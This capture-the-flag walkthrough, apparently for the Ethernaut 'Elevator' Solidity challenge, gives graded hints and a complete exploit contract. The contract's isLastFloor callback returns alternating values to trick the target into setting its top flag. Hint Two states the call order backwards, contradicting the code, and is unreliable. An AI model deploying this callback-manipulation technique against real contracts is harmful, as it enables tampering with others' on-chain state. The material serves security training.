# 11 - Elevator

### Hints

<details>

<summary>Hint one</summary>

You will need to write your own contract that can be used to call the challenge contract’s `goTo` function that also implements the `Building` interface, i.e. contains an `isLastFloor` function that returns a boolean.

</details>

<details>

<summary>Hint Two</summary>

When your proxy contract calls `goTo` on the challenge contract, that contract will in turn call your proxy contract’s `isLastFloor` function **twice** (the first time to pass the if conditional, the second time to set the value of its `top` state variable). The first time this `isLastFloor` function is called, it must return “true”, and the second time it is called it must return “false”. How might you implement a function that returns a different boolean value each time it is called?

</details>

<details>

<summary>Hint Three</summary>

Your proxy contract’s `isLastFloor` function can utilise one of your contract’s own state variables to determine whether to respond with “true” or “false”. The function may return the value of this state variable and also flip it from “true” to “false” so it will return a different value the next time it is called.

</details>

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorExploit {
    IElevator private _elevatorContract;
    bool private _isLastFloor = false;

    /**
     * Constructor sets `Elevator` contract.
     */
    constructor(address elevatorContractAddress) {
        _elevatorContract = IElevator(elevatorContractAddress);
    }

    /**
     * Will be called by `Elevator` contract to confirm `floor` is last floor.
     *
     * Note that this returns 'false' first as the conditional in the contract
     * is: if (! building.isLastFloor(_floor)) { ... }. It then returns 'true'
     * on its second call, when the `top` variable is assigned.
     */
    function isLastFloor(uint floor) external returns (bool) {
        bool _isLastFloorValueToReturn = _isLastFloor;

        _isLastFloor = !_isLastFloor;

        return _isLastFloorValueToReturn;
    }

    /**
     * Calls `Elevator` contract's `goTo` with `floor`.
     */
    function goTo(uint floor) external {
        _elevatorContract.goTo(floor);
    }
}
```
